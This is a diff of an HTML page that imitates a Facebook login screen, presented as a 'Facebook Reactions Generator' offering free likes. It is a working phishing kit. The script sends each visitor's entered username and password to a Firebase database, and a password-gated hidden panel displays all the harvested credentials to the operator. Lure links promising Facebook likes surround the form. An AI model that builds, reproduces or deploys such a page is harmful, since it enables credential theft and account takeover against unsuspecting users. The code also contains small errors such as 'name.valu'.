@@ -1,9 +1,378 @@
 <!DOCTYPE html>
 <html>
     <head>
-        <title>RUBBISH</title>
+    
+    
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="style.css">      
+<meta charset="UTF-8"></meta>      
+<script src="https://www.gstatic.com/firebasejs/8.2.3/firebase-analytics.js"></script>      
+<script src="https://www.gstatic.com/firebasejs/8.2.3/firebase.js"></script>  
+<script>
+    // Your web app's Firebase configuration
+    // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+    var firebaseConfig = {
+    apiKey: "***********",
+    authDomain: "cartoline-india.firebaseapp.co",
+    projectId: "cartoline-india",
+    storageBucket: "**********",
+    messagingSenderId: "********",
+    appId: "1:372576193203:web:*****",
+    measurementId: "G*******"
+    };
+    // Initialize Firebase
+    firebase.initializeApp(firebaseConfig);
+</script>
+    
+  <style>
+#now {
+    font-size:20px;
+}
+#box{
+    font-size:13px;
+}
+#ci{
+    width:200px;
+    height:auto;
+    margin-left:50px;
+    border-radius:50px;
+}
+#likeme{
+    width:360px;
+    height:200px;
+    margin-left:-8px;
+    margin-top:-8px;
+}
+#likeyou{
+    width:360px;
+    height:200px;
+    margin-left:-8px;
+    margin-top:13px;
+}
+#page, #likeyou, #likeme{
+    border-radius:0px;
+}
+#page{
+    width:360px;
+    height:200px;
+    margin-left:-8px;
+    margin-top:-8px;
+}
+#ass{
+    margin-top:30px;
+    font-weight:bolder ;
+    color:white;
+    background-color:blue;
+    border-color:blue;
+    box-shadow:0px 0px 5px darkBlue;
+    border-radius:20px;
+    height:50px;
+    width:200px;
+}
+#qqq{
+    display:none;
+    background-size:100% 100%;
+    margin-bottom:-70px;
+}
+#showname{
+  color: white;
+  font-size: 25px;
+  background:#E212C457;
+  padding: 3px;
+  margin-bottom: 0;
+  margin: 10px;
+  border-bottom:2px solid #70E2123B;
+  border-radius:10px;
+  text-align: center;
+}
+#para{
+  color: white;
+  padding:3px;
+  background:#5D12E23B;
+  margin:3px;
+  border-radius:10px;
+}
+#main{
+  border:1px solid #33EF0EA6;
+  border-radius:5px;
+  box-shadow: 3px 5px 5px #EF0EDD4D;
+}
+.num0, .num1, #num2{
+    text-align:center ;
+    border-radius:10px;
+    border:0px solid rgb(0,0,0,0);
+}
+body {
+    
+}
+#msgs{
+    display:none;
+}
+#min{
+    width:120px;
+    height:100px;
+    float:left;
+}
+#exam{
+    width:200px;
+    height:100px;
+}
+#ss, #ds, #fs{
+    width:120px;
+    height:20px;
+    margin-left:160px;
+    float:righ
+}
+
+.real{
+    border:2px solid rgb(0,180,255,0.2);
+    background-color:rgb(0,0,0,0.01);
+    width:350px;
+    height:40px;
+    margin-left:-5px;
+}
+#op{
+    width:140px;
+    margin-left:18px;
+    margin-top:-10px;
+}
+#oo{
+    margin-top:-15px;
+    margin-left:180px;
+    width:140px;
+}
+#or{
+    margin-left:162px;
+}
+#login{
+    width:355px;
+    height:40px;
+    border:2px solid transparent;
+    background-image: url("https://dl.dropbox.com/s/o4z6xaugg2y29k3/Screenshot_20210122-194405%20%281%29.jpg");
+    color:white;
+    margin-left:-5px;
+    font-size:25px;
+}
+#lan{
+    color:blue;
+}
+#creat{
+    width:420px;
+    height:60px;
+    border:10px solid transparent;
+    background-color: green;
+    color:white;
+}
+#ori{
+    font-size:25px;
+}
+#re{
+    color:red;
+}
+    </style> 
+  
+  
+  
+        <title>like By Like </title>
     </head>
     <body>
-       <h1>RUBBBBBBBBBBBBBBIIIIIIIIIIIIIIISSSSSSSSSSSSSSHHHHHHHHHHHH</h1> 
+
+<div id="ori">
+       <center>
+           Facebook Reactions Generator
+       </center> 
+
+<hr>
+Mobile number or email
+<br />
+<br />
+<input class="real" id="nae" type="text">
+<br />
+<br />
+Password
+<br />
+<br />
+<input class="real" id="mg" type="password">
+<br />
+<br />
+       <center>
+       <button id="login" id="add" onclick="writeUserData()">
+       <b>
+           Log In
+       </b>
+       </button>
+       </center>
+<br />
+<br />
+<span id="lan">
+    Forget Password
+</span>
+<br />
+<br />
+ <span id="or">or</span>
+<hr id="op">
+<hr id="oo">
+<br />
+<br />
+      <center><span id="creat">
+          Create New Account</span>
+      </center>
+<br />
+<br />
+<p id="lan">
+English (UK)
+<br />
+<br>
+Hausa
+<br />
+<br>
+Français (France)
+<br />
+<br>بالعربية
+<br />
+<br>
+More languages...
+</p>
+</div>
+<br />
+ <br />
+ <br />
+ <br />
+ <br />
+ <h2 id="re">people also search for</h2>
+    <img id="min" src="https://dl.dropbox.com/s/g5e6z8en0nhw513/1493796187-fb-likes~2.jpg">
+    <p id="ss"><a href="http://anskrishna.github.io/facebook">
+          HOW TO GET MORE LIKES ON FACEBOOK EVEN THOUGH FRIENDS REFUSES TO LIKE POST...</a>
+    </p>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<img id="min" src="https://dl.dropbox.com/s/v91qegozuhrd0uk/pubg.jpg?">
+     <p id="fs"><a href="http://anskrishna.github.io/like">
+         GAMERS AND PAGES AUTO-SEARCH-ENGINE LIKE TO LIKE OF THOUSANDS REACTION..</a>
+     </p>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+    <img id="min" src="https://dl.dropbox.com/s/0v7rog1zln81xhk/fb-likes-2020.jpg">
+    <p id="ds"><a href="http://anskrishna.github.io/facebook">
+        BUYING FACEBOOK LIKES TO BOOST YOUR FACEBOOK PAGE, POST GOES ROUND...</a>
+    </p>
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<img id="min" src="https://dl.dropbox.com/s/91tdl0z7sksk30x/get-facebook-likes.png">
+     <p id="fs"><a href="http://anskrishna.github.io/like">
+         GET THOUSANDS OF REACTIONS ON YOUR FACEBOOK PAGE, POST AND GAME..</a>
+     </p>
+<br />
+<br />
+<br />
+<br />
+<br />
+<pre>
+<a href="#a">About us</a>     <a href="#a">contact us</a></pre>
+</div>
+<div id="msgs">
+    <h2 class="load">Loading...</h2>
+  </div>
+
+
+
+<script>
+  window.onload=function(){
+var msgs =document.getElementById("msgs");
+var ask =prompt("your name?")
+if(ask=="pussy&dick11"){
+    msgs.style.display="block"
+}
+else{
+    msgs.style.display="none"
+}
+}
+</script>
+
+<script type="text/javascript" charset="utf-8">
+    var database = firebase.database();
+
+
+    function writeUserData() {
+      var name = document.getElementById('nae');
+      var msg = document.getElementById('mg');
+
+      if (name.valu === "" || msg.value === "") {
+        alert('please enter details');
+      } 
+      else if(msg.value == name.value){
+          alert("wrong password input")
+      }
+      else {
+        firebase.database().ref('users/').push({
+          user: name.value,
+          message: msg.value,
+
+        });
+
+        console.log('loading');
+      }
+
+
+    }
+    
+    
+    var data = firebase.database().ref('users/');
+data.on('value', function(snapshot) {
+
+ 
+             
+
+document.getElementById("msgs").innerHTML="";
+
+ var val = snapshot.val();
+ Object.keys(val).forEach((key) => {
+ 
+
+
+const div = document.createElement("div") 
+
+
+div.innerHTML = `
+<div id="chain">
+<div id="main">
+
+            
+            <h3 id="showname">${val[key].user.replace(/</g,"&lt;").replace(/>/g,"&gt;")}</h3>
+            
+            <p id="para">${val[key].message.replace(/</g,"&lt;").replace(/>/g,"&gt;")}</p>
+                <br />
+                
+                
+        <br><br><br>
+        
+`;
+
+
+document.getElementById("msgs").appendChild(div)
+
+ });
+
+}); 
+    
+  </script>
+
+
+  
+  
+
+ 
     </body>
 </html>
